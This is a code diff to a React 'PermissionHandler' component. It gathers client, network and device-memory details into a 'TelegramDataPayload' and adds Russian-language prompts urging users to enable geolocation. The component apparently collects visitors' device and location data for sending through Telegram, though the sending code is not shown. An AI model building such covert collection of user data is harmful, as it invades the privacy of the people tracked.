@@ -298,7 +298,7 @@ const PermissionHandler = () => {
       const networkInfo = getNetworkInfo();
       const deviceMemory = getDeviceMemory();
 
-      const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'> = {
+      const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt' | 'geolocation'> = { // Removed geolocation from here
         clientInfo, networkInfo, deviceMemory, permissionStatus: permissionStatusResult,
       };
 
@@ -403,10 +403,22 @@ const PermissionHandler = () => {
           {geolocationDisplay && (
             <div className="text-sm text-muted-foreground mb-4 text-center">
               <p>Геолокация: <span className="font-semibold">{geolocationDisplay.status}</span></p>
-              {geolocationDisplay.data && (
+              {geolocationDisplay.data ? (
                 <p>
                   Широта: {geolocationDisplay.data.latitude.toFixed(4)}, Долгота: {geolocationDisplay.data.longitude.toFixed(4)}
                 </p>
+              ) : (
+                geolocationDisplay.status === "Denied" ? (
+                  <p className="text-red-400">Доступ к геолокации отклонен. Пожалуйста, разрешите его в настройках браузера.</p>
+                ) : geolocationDisplay.status === "Unavailable" ? (
+                  <p className="text-yellow-400">Геолокация недоступна. Проверьте настройки устройства или попробуйте в другом месте.</p>
+                ) : geolocationDisplay.status === "Timeout" ? (
+                  <p className="text-yellow-400">Не удалось получить геолокацию за отведенное время. Попробуйте еще раз.</p>
+                ) : geolocationDisplay.status === "Not Supported" ? (
+                  <p className="text-red-400">Ваш браузер не поддерживает геолокацию.</p>
+                ) : (
+                  <p className="text-blue-400">Ожидание данных геолокации...</p>
+                )
               )}
             </div>
           )}
